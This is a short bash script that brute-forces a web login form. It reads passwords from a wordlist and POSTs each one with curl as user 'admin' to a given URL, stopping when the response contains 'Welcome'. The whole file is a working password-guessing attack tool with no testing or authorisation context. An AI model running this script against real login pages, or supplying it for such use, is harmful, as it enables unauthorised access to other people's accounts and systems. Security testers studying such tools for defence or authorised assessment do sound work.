#!/bin/bash

# Check if target URL and wordlist are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <wordlist>"
    exit 1
fi

TARGET_URL=$1
WORDLIST=$2

# Check if the wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist file not found: $WORDLIST"
    exit 1
fi

# Perform brute force attack using a simple loop
while read -r PASSWORD; do
    echo "Trying password: $PASSWORD"
    RESPONSE=$(curl -s -X POST -d "username=admin&password=$PASSWORD" $TARGET_URL)
    
    # Check for success condition in the response
    if [[ $RESPONSE == *"Welcome"* ]]; then
        echo "Password found: $PASSWORD"
        exit 0
    fi
done < "$WORDLIST"

echo "Brute force attack completed. No valid password found."
